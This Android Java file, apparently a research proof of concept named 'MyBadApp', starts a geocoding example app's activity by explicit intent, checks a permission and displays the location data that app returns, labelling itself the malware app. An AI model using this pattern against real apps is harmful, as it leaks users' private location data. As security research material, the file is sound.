package com.gatech.gtri;





import android.app.Activity;
import android.content.ComponentName;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.os.Bundle;
import android.util.Log;
import android.widget.Toast;


public class MyBadApp extends Activity {
	
	public String location = null;
	public PackageManager pmanager;

    /** Called when the activity is first created. */
    @Override
    public void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        //setContentView(R.layout.main);
        location = new String();
        ComponentName myTestCN = new ComponentName("example.geocoding", "example.geocoding.Main");
        Intent myTestIntent = new Intent();
        myTestIntent.setComponent(myTestCN);
        System.out.println("******i am here*****");
        //this.startActivityForResult(myTestIntent,1);
        pmanager = getPackageManager();
        
        int result = 999;
        result = pmanager.checkPermission("MAIN_ACCESS", "example.geocoding");
        
        System.out.println("The check permission returned = "+result);
        
        this.startActivityForResult(myTestIntent,RESULT);
        
        }

 // TODO Auto-generated method stub
    @Override
    protected void onActivityResult(int requestCode, int resultCode, Intent data) {
    	switch(requestCode){
    	case RESULT:
    		if(resultCode == RESULT_OK){
    			//Log.v("data from victim",""+data.getExtras().toString());
    			//String result = data.getStringExtra("RESULT");
    			
    			Toast.makeText(this, "The data is received in the malware app with loc" + " " + data.getStringExtra("loc"), Toast.LENGTH_LONG).show();
    			
    			
    			
                break;
                
                
    		}
    	    	
    	
    	}
    	
    	
    	
    	
    }
    /*
     * Constant to identify the result
     */
    public final int RESULT = 1;
   }


    

